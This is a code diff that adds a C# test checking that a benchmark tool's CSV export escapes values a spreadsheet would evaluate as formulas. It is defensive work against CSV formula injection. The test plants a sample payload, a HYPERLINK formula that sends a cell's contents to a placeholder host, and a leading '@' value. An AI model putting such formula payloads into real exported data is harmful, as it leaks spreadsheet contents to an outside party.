@@ -177,6 +177,34 @@ public sealed class BenchmarkExportEndpointTests
             lines[1]);
     }
 
+    [Test]
+    public async Task ExportCsv_ForAValueASpreadsheetWouldEvaluate_EscapesItAsText()
+    {
+        // `model`, `modelGroupKey` and `quant` come from an operator-installed model name (or an HF repo id), and
+        // `stopReason` is provider text stored verbatim. Opened in Excel or LibreOffice with formula evaluation on, a
+        // leading `=`/`+`/`-`/`@`/tab/CR turns a data cell into a formula. Zero-cost to close, so it is closed.
+        await using var context = CreateContext();
+        ArrangeProject(context);
+        ArrangeRuns(context,
+            Run(BenchmarkPrimaryStatus.Succeeded, modelName: "=HYPERLINK(\"http://x/\"&A1,\"ok\")") with
+            {
+                PrimaryStopReason = "@stop"
+            });
+        using var client = context.Factory.CreateClient();
+        using var request = Authorized(context.Factory, Api + $"/projects/{ProjectId}/export.csv");
+
+        using var response = await client.SendAsync(request).ConfigureAwait(false);
+        var body = await response.Content.ReadAsStringAsync().ConfigureAwait(false);
+
+        AssertEx.Equal(HttpStatusCode.OK, response.StatusCode);
+        var row = body.Split("\r\n", StringSplitOptions.RemoveEmptyEntries)[1];
+
+        // Quoted with a leading apostrophe — the spreadsheet-standard text escape, which readers strip back off — with
+        // the embedded quotes still doubled per RFC 4180.
+        AssertEx.Contains(row, "\"'=HYPERLINK(\"\"http://x/\"\"&A1,\"\"ok\"\")\"");
+        AssertEx.Contains(row, ",\"'@stop\",");
+    }
+
     private static void ArrangeProject(Context context) =>
         context.Store.GetProjectAsync(ProjectId, Arg.Any<CancellationToken>()).Returns(Project());
 
